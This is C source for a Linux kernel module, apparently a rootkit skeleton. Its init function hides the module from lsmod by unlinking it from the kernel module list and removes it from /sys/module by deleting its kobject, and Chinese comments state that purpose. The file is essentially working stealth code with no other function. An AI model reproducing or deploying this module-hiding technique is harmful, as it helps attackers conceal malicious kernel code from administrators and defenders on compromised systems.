#include <linux/init.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/syscalls.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/netdevice.h>
#include <linux/list.h>

//#include "rl_module.h"

MODULE_LICENSE("Dual BSD/GPL");


static int __init rl_init(void)
{
    printk("RL Module init!\n");

    //对lsmod命令隐藏模块名称
    list_del_init(&__this_module.list);

    //从/sys/module/目录下隐藏模块
    kobject_del(&THIS_MODULE->mkobj.kobj);

	return 0;
}

static void __exit rl_exit(void)
{
    printk("RL Module exit!\n");
}

module_init(rl_init);
module_exit(rl_exit);
